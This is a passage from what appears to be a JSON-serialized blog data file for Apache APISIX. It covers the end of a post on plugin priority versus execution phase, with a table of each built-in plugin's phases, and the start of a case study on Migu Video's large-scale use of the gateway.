`localhost:9080/v1/hello`, APISIX will first mirror the request, then remove the `/v1` prefix. Hence, the new API receives `/v1/hello` instead of `/hello`. It\'s possible to override the default priority to fix it:\\n\\n```yaml\\nroutes:\\n  - id: 1\\n    uri: \\"/v1/hello*\\"\\n    upstream_id: 1\\n    plugins:\\n      proxy-rewrite:\\n        _meta:\\n          priority: 1020                             #1\\n        regex_uri: [\\"/v1(.*)\\", \\"$1\\"]\\n      proxy-mirror:\\n        host: http://new.api:8082\\n```\\n\\n1. Override the default priority\\n\\nNow, `proxy-rewrite` has higher priority than `proxy-mirror`: the former runs before the latter.\\n\\nIn this case, it works flawlessly; in others, it might not. Let\'s dive further.\\n\\n## APISIX phases\\n\\nAPISIX runs plugins not only according to their priorities but also through dedicated phases. Because APISIX builds upon OpenResty, which builds upon ngxinx, the phases are very similar to the phases of these two components.\\n\\nnginx defines several [phases](http://nginx.org/en/docs/dev/development_guide.html#http_phases) an HTTP request goes through:\\n\\n1. `NGX_HTTP_POST_READ_PHASE`\\n2. `NGX_HTTP_SERVER_REWRITE_PHASE`\\n3. `NGX_HTTP_FIND_CONFIG_PHASE`\\n4. `NGX_HTTP_REWRITE_PHASE`\\n5. `NGX_HTTP_POST_REWRITE_PHASE`\\n6. `NGX_HTTP_PREACCESS_PHASE`\\n7. `NGX_HTTP_ACCESS_PHASE`\\n8. `NGX_HTTP_POST_ACCESS_PHASE`\\n9. `NGX_HTTP_PRECONTENT_PHASE`\\n10. `NGX_HTTP_CONTENT_PHASE`\\n11. `NGX_HTTP_LOG_PHASE`\\n\\nEach phase focuses on a task, _i.e._, `NGX_HTTP_ACCESS_PHASE` verifies that the client is authorized to make the request.\\n\\nIn turn, OpenResty offers similarly named phases.\\n\\n[From nginx documentation:](https://openresty-reference.readthedocs.io/en/latest/Directives/)\\n\\n![Order of Lua Nginx Module Directives](https://cloud.githubusercontent.com/assets/2137369/15272097/77d1c09e-1a37-11e6-97ef-d9767035fc3e.png)\\n\\nimage:77d1c09e-1a37-11e6-97ef-d9767035fc3e.png[,840,761]\\n\\nFinally, here are the phases of Apache APISIX:\\n\\n1. `rewrite`\\n2. `access`\\n3. `before_proxy`\\n4. `header_filter`\\n5. `body_filter`\\n6. `log`\\n\\n[From Apache APISIX documentation:](https://apisix.apache.org/docs/apisix/terminology/plugin/#plugins-execution-lifecycle)\\n\\n![Order of Apache APISIX phases](https://static.apiseven.com/uploads/2023/03/09/ZsH5C8Og_plugins-phases.png)\\n\\nWe have seen two ways to order plugins: by priority and by phase. Now comes the most important rule: **order by priority only works inside a phase**!\\n\\nFor example, the `redirect` plugin has a priority of 900 and runs in phase `rewrite`; the `gzip` plugin has a priority of 995 and runs in phase `body_filter`. Regardless of their respective priorities, `redirect` will happen before `gzip`, because `rewrite` happens before `body_filter`. Likewise, changing a priority won\'t \\"move\\" a plugin out of its phase.\\n\\nThe example above with `proxy-mirror` and `proxy-rewrite` worked because both run in the `rewrite` phase.\\n\\nThe main issue is that priority is documented in the [config-default.yaml](https://github.com/apache/apisix/blob/master/conf/config-default.yaml#L438) file, while the phase is buried in the code. Worse, some plugins run across different phases. For example, let\'s check the proxy `proxy-rewrite` plugin and, more precisely, the functions defined [there](https://github.com/apache/apisix/blob/master/apisix/plugins/proxy-rewrite.lua):\\n\\n* `local function is_new_headers_conf(headers)`\\n* `local function check_set_headers(headers)`\\n* `function _M.check_schema(conf)`\\n* `function _M.rewrite(conf, ctx)`\\n\\nThe name of the `rewrite()` function is suspiciously similar to one of the phases above. Looking at other plugins, we see the same pattern repeat. Apache APISIX runs plugin functions with the same name as the phase.\\n\\nI took the liberty of summarizing all plugins and their respective phases in a table.\\n\\n<table>\\n<thead>\\n<tr>\\n  <th>Plugin</th>\\n  <th colspan=\\"6\\">Phase</th>\\n</tr>\\n<tr>\\n  <th><em>General</em></th>\\n  <th><code>rewrite</code></th>\\n  <th><code>access</code></th>\\n  <th><code>before_proxy</code></th>\\n  <th><code>header_filter</code></th>\\n  <th><code>body_filter</code></th>\\n  <th><code>log</code></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td><code>redirect</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>echo</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>gzip</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>real-ip</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>ext-plugin-pre-req</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>ext-plugin-post-req</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>ext-plugin-post-resp</code></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>workflow</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n</tbody>\\n<thead>\\n<tr>\\n  <th><em>Transformation</em></th>\\n  <th><code>rewrite</code></th>\\n  <th><code>access</code></th>\\n  <th><code>before_proxy</code></th>\\n  <th><code>header_filter</code></th>\\n  <th><code>body_filter</code></th>\\n  <th><code>log</code></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td><code>response-rewrite</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>proxy-rewrite</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>grpc-transcode</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>grpc-web</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>fault-injection</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>mocking</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>degraphql</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>body-transformer</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n</tbody>\\n<thead>\\n<tr>\\n  <th><em>Authentication</em></th>\\n  <th><code>rewrite</code></th>\\n  <th><code>access</code></th>\\n  <th><code>before_proxy</code></th>\\n  <th><code>header_filter</code></th>\\n  <th><code>body_filter</code></th>\\n  <th><code>log</code></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td><code>key-auth</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>jwt-auth</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>basic-auth</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>authz-keycloak</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>authz-casdoor</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>wolf-rbac</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>openid-connect</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>cas-auth</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>hmac-auth</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>authz-casbin</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>ldap-auth</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>opa</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>forward-auth</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n</tbody>\\n<thead>\\n<tr>\\n  <th><em>Security</em></th>\\n  <th><code>rewrite</code></th>\\n  <th><code>access</code></th>\\n  <th><code>before_proxy</code></th>\\n  <th><code>header_filter</code></th>\\n  <th><code>body_filter</code></th>\\n  <th><code>log</code></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td><code>cors</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>uri-blocker</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>ua-restriction</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>referer-restriction</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>consumer-restriction</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>csrf</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>public-api</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>chaitin-waf</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n</tbody>\\n<thead>\\n<tr>\\n  <th><em>Traffic</em></th>\\n  <th><code>rewrite</code></th>\\n  <th><code>access</code></th>\\n  <th><code>before_proxy</code></th>\\n  <th><code>header_filter</code></th>\\n  <th><code>body_filter</code></th>\\n  <th><code>log</code></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td><code>limit-req</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>limit-conn</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>limit-count</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>proxy-cache</code> (init)</td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>proxy-cache</code> (disk)</td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>proxy-cache</code> (memory)</td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>request-validation</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>proxy-mirror</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>api-breaker</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>traffic-split</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>request-id</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>proxy-control</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>client-control</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n</tbody>\\n<thead>\\n<tr>\\n  <th><em>Observability</em></th>\\n  <th><code>rewrite</code></th>\\n  <th><code>access</code></th>\\n  <th><code>before_proxy</code></th>\\n  <th><code>header_filter</code></th>\\n  <th><code>body_filter</code></th>\\n  <th><code>log</code></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td><code>zipkin</code></td>\\n  <td>X</td>\\n  <td>X</td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>skywalking</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>opentelemetry</code></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>prometheus</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>node-status</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>datadog</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>http-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>skywalking-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>tcp-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>kafka-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>rocketmq-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>udp-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>clickhouse-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>syslog</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>log-rotate</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>error-log-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>sls-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>google-cloud-logging</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>splunk-hec-logging</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>file-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>loggly</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>elasticsearch-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>tencent-cloud-cls</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n</tr>\\n<tr>\\n  <td><code>loki-logger</code></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td>X</td>\\n  <td>X</td>\\n</tr>\\n</tbody>\\n<thead>\\n<tr>\\n  <th><em>Other</em></th>\\n  <th><code>rewrite</code></th>\\n  <th><code>access</code></th>\\n  <th><code>before_proxy</code></th>\\n  <th><code>header_filter</code></th>\\n  <th><code>body_filter</code></th>\\n  <th><code>log</code></th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n  <td><code>serverless</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>openwhisk</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>dubbo-proxy</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n<tr>\\n  <td><code>kafka-proxy</code></td>\\n  <td></td>\\n  <td>X</td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n  <td></td>\\n</tr>\\n</tbody>\\n</table>\\n\\n## Conclusion\\n\\nI\'ve detailed Apache APISIX plugin phases and priorities in this post. I\'ve explained their relationship with one another. Icing on the cake, I documented each out-of-the-box plugin\'s phase(s). I hope it will prove helpful.\\n\\n**To go further:**\\n\\n* [Default plugin priorities](https://github.com/apache/apisix/blob/master/conf/config-default.yaml#L438)\\n* [Apache APISIX plugin execution lifecycle](https://apisix.apache.org/docs/apisix/terminology/plugin/#plugins-execution-lifecycle)\\n* [Plugin execution code](https://github.com/apache/apisix/blob/master/apisix/plugin.lua#L1126-L1193)\\n\\n_Originally published at [A Java Geek](https://blog.frankel.ch/apisix-plugins-priority-leaky-abstraction/) on December 10<sup>th</sup>, 2023_"},{"id":"How to Supercharge Large-Scale Video Operations with APISIX","metadata":{"permalink":"/blog/2023/12/14/migu-video-adopts-apisix","source":"@site/blog/2023/12/14/migu-video-adopts-apisix.md","title":"How to Supercharge Large-Scale Video Operations with APISIX","description":"Explore the ultimate guide on optimizing large-scale video operations using APISIX in Migu Video.","date":"2023-12-14T00:00:00.000Z","formattedDate":"December 14, 2023","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":8.525,"truncated":true,"authors":[{"name":"Yu Xia","title":"Author"},{"name":"Yilia Lin","title":"Technical Writer","url":"https://github.com/Yilialinn","image_url":"https://github.com/Yilialinn.png","imageURL":"https://github.com/Yilialinn.png"}],"prevItem":{"title":"Apache APISIX plugin priority, a leaky abstraction?","permalink":"/blog/2023/12/14/apisix-plugins-priority-leaky-abstraction"},"nextItem":{"title":"Canary releases with Apache APISIX","permalink":"/blog/2023/12/07/canary-releases-apisix"}},"content":"> Author: Yu Xia, Senior DevOps Engineer at Migu Video Construction and Operation Center. This article is based on a presentation given by Yu Xia at the APISIX Shanghai Meetup in November 2023.\\n\x3c!--truncate--\x3e\\n\\nToday, I would like to share with you some of the experiences and achievements of Migu Video in implementing and practicing APISIX in large-scale video business scenarios. I will share our experiences and accomplishments from six perspectives.\\n\\n## About Migu Video\\n\\nMigu Culture Technology Co., Ltd (Migu), is a subsidiary of China Mobile, specializing in the field of mobile internet. It functions as an integrated professional entity responsible for providing, operating, and servicing digital content products. Migu serves as the sole operational entity under China Mobile\'s music, video, reading, gaming, and new digital business sectors. It encompasses five sub-companies: Migu Music, Migu Video, Migu Digital Media, Migu Fun, and Migu Animation.\\n\\nMigu has emerged as a leading comprehensive platform in China that boasts an extensive collection, including over 35 million songs, 4.6 million videos, 600,000 publications, 1,100 games, and 750,000 episodes of new digital content.\\n\\nLooking ahead, Migu is committed to innovating in \\"Internet + Digital Content\\" operations. It aims to integrate various contents with multiple channels, actively engaging in cross-domain IP operations. Migu is dedicated to building four major platforms: new media integration, digital content aggregation, copyright transactions, and content entrepreneurship and innovation. Its goal is to bring about a transformation in users\' entertainment lifestyles.\\n\\n## Why Do We Need APISIX\uff1f\\n\\nDuring the technology selection, we noticed that APISIX is an open-source API gateway that provides high performance, high availability, and scalability. APISIX also supports multiple protocols, including HTTP, WebSocket, gRPC, and various plugins such as rate limiting, authentication, authorization, and logging, making it suitable for various API gateway requirements in different scenarios. Additionally, APISIX has unique advantages in microservices frameworks and cloud-native environments.\\n\\nWe particularly value APISIX for its high performance, dynamic routing capabilities, security protection, and the flexibility of its plugin system.\\n\\n## Requirements for Large-Scale Video Services\\n\\nMigu Video faced several challenges in its business scenarios, including high concurrent access, high-security requirements, and fault recovery. The live streaming scenarios are demanding in transmission requirements and require support for multiple formats and protocols, and content delivery acceleration through Content Delivery Network (CDN). These are the characteristics of our business. Luckily, APISIX, as a high-performance solution, can help us address these challenges.\\n\\n- **High Traffic and High Concurrency**: Video services typically face a large number of user requests and require handling high concurrency situations.\\n\\n- **High Real-time Requirement**: It is crucial to ensure real-time data transmission and display in live streaming and similar scenarios.\\n\\n- **Support for Multiple Formats and Protocols**: Video services may involve various video formats and transmission protocols.\\n\\n- **CDN Acceleration**: To provide a better user experience, video services often make use of CDN for accelerated content delivery.\\n\\n### APISIX Implementation in Large-Scale Video Services\\n\\nNext, let\'s delve into the specific use cases of APISIX in our video service business, focusing on traffic scheduling and management, dynamic routing, and security protection.\\n\\n- **Traffic Scheduling and Management**: We have been exploring traffic scheduling and management, aiming to control the traffic scheduling and rate limiting, thus avoiding or intercepting certain requests by leveraging APISIX plugins.\\n\\n- **Dynamic Routing**: Dynamic routing was one of the key features that initially attracted us to APISIX. Previously, our centralized gateway mainly relied on a version of OpenResty. However, due to the frequent changes in our business and routing information, making online modifications to the routing configuration posed certain risks. APISIX, with its dynamic routing and hot configuration through Dashboard, allows us to publish changes without reloading the service, which is highly valuable to us.\\n\\n- **Security Protection**: We aim to utilize APISIX\'s security protection features to safeguard our video services from various network attacks effectively. For example, by configuring APISIX\'s firewall rules, we can filter out malicious requests and ensure the stable operation of our business.\\n\\n### Gateway Customization Based on APISIX\\n\\nCurrently, Migu Video has completed their customization of 11 sets of gateways, as well as 4 sets of environments waiting for release to the production environments.\\n\\nThese 11 sets of gateways cover the main gateways of our centralized business. For example, there is a public gateway for user login, a user management center gateway responsible for user authentication capabilities, a sales gateway for user product purchases, and the Professional User Generated Content (PUGC) gateway required for the newly added live streaming business in 2023. Additionally, we have also transformed the gateway for cinema ticketing.\\n\\nThe current APISIX gateway environment at Migu generally follows a dual-data center architecture. Each data center has multiple APISIX services, a set of etcd clusters with 3 nodes typically, and a Dashboard service for frontend route configuration. Additionally, we use self-developed signature verification and token verification plugins, mainly for gateway signature and token validation.\\n\\n### Useful Plugins\\n\\nIn addition to our self-developed plugins, we also utilize the built-in Prometheus and Grafana plugins provided by APISIX, primarily for monitoring the APISIX gateway.\\n\\nExcept that, during the initial deployment of APISIX, we received technical support from the original manufacturer-API7.ai. They assisted us in conducting inspections in the production environment and addressed various issues. This included adjustments to plugins and resource allocation, resolving potential issues that may have been encountered in the live environment.\\n\\n### Monitoring and Alerting\\n\\nApart from some aided monitoring solutions, we mostly use Prometheus and Grafana.\\n\\nPrometheus and Grafana are official plugins provided by APISIX. We primarily use them to monitor metrics such as error rates, latency, TPS, the health of the etcd clusters, shared memory status, and message-sending rate within the APISIX gateway.\\n\\nThese metrics are typically displayed in visual charts, providing a more intuitive and clear view of the system\'s performance.\\n\\n## APISIX Adaptation for Other Operating Systems\\n\\nTo enhance the competitiveness of our group, we needed to use many other operating systems, during which we encountered some challenges.\\n\\n- **Environment Differences**: Due to certain differences among Windows, Unix, Linux, and other operating systems, we had to make adjustments for compatibility with different dependency libraries\\n\\n- **Package Management**: Owing to the customized dependency packages of various operating systems, we needed to reconfigure some foundational software packages to ensure compatibility.\\n\\n- **Performance**: Initially, we were unsure about the performance of APISIX on a new operating system. Therefore, we conducted several testing phases.\\n\\nFirst, we adapted APISIX to the operating system in a test environment and resolved any dependency package-related issues. Then, we conducted stress testing on a set of PUGC gateways. This business has already been extensively deployed in our services during the Four International Competitions in 2023, including the Hangzhou Asian Games, the Summer World University Games in Chengdu, the 2023 FIFA Women\'s World Cup, and the 2023 FIBA Basketball World Cup.\\n\\nCurrently, the practical testing of APISIX on the new operating system has proved that APISIX can perfectly  meet our business requirements by handling many concurrent live-streaming sessions on the new operating system.\\n\\n### Strategic Development Approach: Containerizing APISIX\\n\\nOne of our development strategies is to containerize APISIX. Currently, our main environment is based on VM, but we plan to transition to Kubernetes (K8s) in the future. Considering that many gateways within Migu have already migrated into APISIX, we have chosen the APISIX Ingress Controller as our gateway for containerization.\\n\\nCurrently, our VM environment is based on LVS (Linux Virtual Server), but we expect to transition to using the APISIX Ingress Controller in a containerized environment.\\n\\nThe containerization plan will be conducted in two steps. First, due to the high stability requirements of our business, we may initially replace some services, allowing VM and containerized environments to coexist. Then, we will enable a gradual migration from VM to containerization.\\n\\n## Practical Effects and Optimization\\n\\n### Improvement in Business Performance with APISIX\\n\\n- **Enhanced Request Processing Efficiency**: APISIX utilizes a high-performance asynchronous non-blocking design, enabling it to handle a large number of concurrent requests. This significantly improves the request processing efficiency for video-related businesses.\\n\\n- **Reduced Latency**: Through APISIX\'s intelligent routing and proximity-based node distribution strategies, network latency for video-related businesses is effectively reduced, thereby enhancing user experience.\\n\\n- **Increased Stability**: APISIX itself has high availability and fault-tolerance mechanisms, reducing the impact of backend service failures and improving the overall stability of the business.\\n\\n### Significance and Value of Implementation\\n\\n- **Enhanced Performance**: With APISIX\'s high-performance and high-concurrency capabilities, video-related businesses can better handle access requests from a large number of users, ensuring business stability and availability.\\n\\n- **Simplified Architecture and Operations**: APISIX provides rich functionalities and plugins, resulting in a more streamlined backend architecture while reducing operational complexity. This, in turn, improves development and operational efficiency.\\n\\n- **Improved Scalability**: Leveraging APISIX\'s distributed nature, video-related businesses can easily scale horizontally to meet the growing demands of the business.\\n\\n## Looking to the Future\\n\\nCurrently, Migu Video is facing some challenges, which also serve as our future research directions. These include integrating the use of APISIX rate-limiting plugins to implement mechanisms such as setting thresholds for circuit breaking and degradation. Additionally, we aim to match business needs by implementing proactive health checks for the gateway and introducing a graphical routing configuration interface for the Ingress Controller.\\n\\nWe have high expectations for the future development of APISIX, which include:\\n\\n- **Enhanced Functionality Plugins**: We anticipate that APISIX will provide a broader range of more comprehensive functionality plugins to meet the demands of various business scenarios.\\n\\n- **Improved Performance**: With the continuous development of technologies such as 5G and cloud computing, the performance requirements for gateways are becoming increasingly demanding. We hope that APISIX will continuously optimize its performance to meet higher-level requirements.\\n\\n- **Deeper Ecosystem Collaboration**: We hope that APISIX will engage in extensive collaboration with more open-source projects and commercial companies, working together to build a more comprehensive technological ecosystem.\\n\\nIn summary, APISIX, as a distributed gateway, plays a crucial role in Migu\'s large-scale video-related businesses. Its practical implementation not only enhances business performance and simplifies backend architecture but also provides strong support for the 